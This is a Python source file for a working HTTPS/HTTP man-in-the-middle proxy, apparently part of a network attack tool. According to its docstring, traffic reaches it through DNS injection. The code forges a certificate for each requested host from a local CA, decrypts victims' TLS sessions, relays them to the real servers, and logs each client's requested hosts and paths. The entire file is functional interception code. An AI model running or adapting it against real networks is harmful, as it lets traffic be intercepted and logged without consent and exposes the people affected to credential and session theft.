import ssl
import socket
import select
import threading

from .cert_authority import CertAuthority


class MITMProxy(object):
    """
    HTTPS/HTTP man-in-the-middle proxy.

    Traffic is steered here by DNS injection (the target resolves hosts to this
    machine). For each connection it terminates TLS using an on-the-fly certificate
    minted for the requested SNI by the local CA, reads the HTTP request, connects
    to the real upstream (resolved independently of the hijacked DNS), relays the
    exchange, and reports it via the on_event callback.

    Clients that trust the CA, or that do not strictly validate certificates,
    are intercepted transparently. Strict clients need the CA installed; its path
    is CertAuthority.ca_cert_path.
    """

    def __init__(self, ca=None, http_port=80, https_port=443, bind='0.0.0.0', on_event=None):
        self.ca = ca or CertAuthority()
        self.http_port = http_port
        self.https_port = https_port
        self.bind = bind
        self.on_event = on_event          # callable(dict) -> None
        self._running = False
        self._servers = []

        # one reusable server context; the SNI callback swaps in a per-host cert
        self._tls_ctx = self.ca.context_for('evillimiter.fallback')
        self._tls_ctx.sni_callback = self._sni_callback

        # upstream verification context (normal trust: we are a real client to the real server)
        self._up_ctx = ssl.create_default_context()

    # --- lifecycle -------------------------------------------------------
    def start(self):
        if self._running:
            return
        self._running = True
        for port, is_tls in ((self.http_port, False), (self.https_port, True)):
            t = threading.Thread(target=self._listen, args=(port, is_tls), daemon=True)
            t.start()

    def stop(self):
        self._running = False
        for s in self._servers:
            try:
                s.close()
            except Exception:
                pass

    def _listen(self, port, is_tls):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.bind, port))
        except OSError as e:
            self._emit({'event': 'bind_error', 'port': port, 'error': str(e)})
            return
        srv.listen(128)
        srv.settimeout(1.0)
        self._servers.append(srv)
        while self._running:
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(conn, addr, is_tls), daemon=True).start()

    # --- per-connection --------------------------------------------------
    def _sni_callback(self, sslsock, server_name, _ctx):
        if server_name:
            try:
                sslsock.context = self.ca.context_for(server_name)
            except Exception:
                pass

    def _handle(self, conn, addr, is_tls):
        upstream = None
        try:
            conn.settimeout(15)
            if is_tls:
                client = self._tls_ctx.wrap_socket(conn, server_side=True)
                default_port = 443
            else:
                client = conn
                default_port = 80

            request, headers = self._read_request(client)
            if request is None:
                return
            host, port = self._target(headers, default_port)
            if not host:
                return

            method, path = self._reqline(request)
            self._emit({'event': 'request', 'client': addr[0], 'scheme': 'https' if is_tls else 'http',
                        'host': host, 'method': method, 'path': path})

            upstream = socket.create_connection((host, port), timeout=15)
            if is_tls:
                upstream = self._up_ctx.wrap_socket(upstream, server_hostname=host)
            upstream.sendall(request)
            self._relay(client, upstream)
        except Exception as e:
            self._emit({'event': 'error', 'client': addr[0], 'error': str(e)})
        finally:
            for s in (conn, upstream):
                try:
                    s.close()
                except Exception:
                    pass

    def _read_request(self, sock):
        """Read until end of HTTP headers; return (raw_bytes, headers_dict)."""
        buf = b''
        while b'\r\n\r\n' not in buf:
            chunk = sock.recv(65536)
            if not chunk:
                return (None, None) if not buf else (buf, self._parse_headers(buf))
            buf += chunk
            if len(buf) > 262144:        # header cap
                break
        return buf, self._parse_headers(buf)

    @staticmethod
    def _parse_headers(buf):
        headers = {}
        try:
            head = buf.split(b'\r\n\r\n', 1)[0].decode('latin-1')
            for line in head.split('\r\n')[1:]:
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().lower()] = v.strip()
        except Exception:
            pass
        return headers

    @staticmethod
    def _reqline(buf):
        try:
            line = buf.split(b'\r\n', 1)[0].decode('latin-1').split(' ')
            return line[0], line[1]
        except Exception:
            return '?', '?'

    def _target(self, headers, default_port):
        host = headers.get('host', '')
        if not host:
            return None, default_port
        if ':' in host:
            h, p = host.rsplit(':', 1)
            try:
                return h, int(p)
            except ValueError:
                return h, default_port
        return host, default_port

    def _relay(self, a, b):
        socks = [a, b]
        try:
            while True:
                r, _, _ = select.select(socks, [], [], 30)
                if not r:
                    break
                for s in r:
                    data = s.recv(65536)
                    if not data:
                        return
                    (b if s is a else a).sendall(data)
        except Exception:
            pass

    def _emit(self, event):
        if self.on_event:
            try:
                self.on_event(event)
            except Exception:
                pass
